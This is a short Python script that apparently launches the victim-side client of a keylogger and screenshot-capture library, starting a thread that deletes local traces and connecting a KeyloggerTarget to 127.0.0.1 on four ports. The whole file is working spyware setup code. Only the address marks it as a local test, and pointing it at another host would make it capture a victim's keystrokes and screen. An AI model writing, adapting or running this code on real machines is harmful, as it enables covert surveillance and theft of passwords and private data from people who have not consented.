import KeyloggerScreenshot as ks 
import threading

thread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)
thread_deleter.start()

ip = '127.0.0.1'
key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333, ip, 4444)
key_client.start()
